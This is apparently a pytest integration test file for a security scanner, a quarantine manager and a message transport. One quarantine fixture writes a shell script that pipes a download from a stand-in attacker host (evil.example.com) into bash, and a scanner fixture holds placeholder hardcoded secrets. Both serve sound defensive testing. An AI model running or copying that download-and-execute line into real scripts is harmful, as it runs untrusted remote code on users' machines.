"""Integration tests: SKSecurity scanning + SKComm transport safety.

Tests the cross-package flow:
  1. SKSecurity: scan content for threats
  2. SKSecurity: quarantine suspicious files
  3. SKComm envelope validation: ensure transport rejects bad payloads

No mocks. Real scanning. Real filesystem quarantine.
"""

from __future__ import annotations

from pathlib import Path

import pytest


class TestSecurityScanning:
    """Verify SKSecurity scanner detects known threat patterns."""

    def test_scan_clean_directory(self, tmp_path: Path) -> None:
        """Clean directory produces zero-threat scan result."""
        from sksecurity.scanner import SecurityScanner

        clean_dir = tmp_path / "clean"
        clean_dir.mkdir()
        (clean_dir / "safe_file.py").write_text("print('hello sovereign world')\n")

        scanner = SecurityScanner()
        result = scanner.scan(str(clean_dir))

        assert result is not None
        assert result.threat_count == 0

    def test_scan_detects_embedded_secrets(self, tmp_path: Path) -> None:
        """Scanner flags files containing hardcoded secrets."""
        from sksecurity.scanner import SecurityScanner

        suspect_dir = tmp_path / "suspect"
        suspect_dir.mkdir()
        (suspect_dir / "config.py").write_text(
            'AWS_SECRET_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"\n'
            'DATABASE_PASSWORD = "hunter2"\n'
        )

        scanner = SecurityScanner()
        result = scanner.scan(str(suspect_dir))

        assert result is not None
        assert result.threat_count > 0
        assert result.risk_score > 0


class TestQuarantineManager:
    """Verify SKSecurity quarantine isolates threats properly."""

    def test_quarantine_and_restore_cycle(self, tmp_path: Path) -> None:
        """File quarantined can be listed and restored."""
        from sksecurity.quarantine import QuarantineManager

        quarantine_dir = tmp_path / ".sksecurity" / "quarantine"
        manager = QuarantineManager(base_path=quarantine_dir)

        target_file = tmp_path / "suspicious.sh"
        target_file.write_text("#!/bin/bash\ncurl http://evil.example.com | bash\n")

        record = manager.quarantine(
            file_path=str(target_file),
            threat_type="command_injection",
            severity="high",
            reason="Integration test: suspicious download-and-execute pattern",
        )

        assert record is not None
        assert not target_file.exists(), "Original file should be moved to quarantine"

        records = manager.list_records()
        assert len(records) >= 1

        restored = manager.restore(record.quarantine_path)
        assert restored is True
        assert target_file.exists(), "File should be restored to original location"


class TestTransportSecurityBoundary:
    """Verify SKComm transport handles adversarial payloads gracefully."""

    def test_oversized_envelope_rejected(self, tmp_path: Path) -> None:
        """Transport should handle extremely large payloads without crashing."""
        from skcomm.models import MessageEnvelope, MessagePayload
        from skcomm.transports.file import FileTransport

        outbox = tmp_path / "outbox"
        outbox.mkdir()

        # Create a large but not absurdly huge payload
        large_content = "A" * (1024 * 100)  # 100KB

        envelope = MessageEnvelope(
            sender="security-test",
            recipient="validator",
            payload=MessagePayload(content=large_content),
        )

        transport = FileTransport(outbox_path=outbox, archive=False)
        result = transport.send(envelope.to_bytes(), "validator")

        # Should succeed (it's not malicious, just large)
        assert result.success is True

    def test_malformed_envelope_handling(self, tmp_path: Path) -> None:
        """Transport receive handles malformed files without crashing."""
        from skcomm.transports.file import FileTransport

        inbox = tmp_path / "inbox"
        inbox.mkdir()

        # Write invalid envelope data
        bad_file = inbox / "bad-message.skc.json"
        bad_file.write_text("this is not valid json envelope data{{{")

        transport = FileTransport(inbox_path=inbox, archive=False)

        # Should not raise - gracefully skip or return empty
        try:
            received = transport.receive()
            # If it returns, the malformed data should be excluded
        except Exception:
            # Some implementations may raise - that's acceptable too
            pass
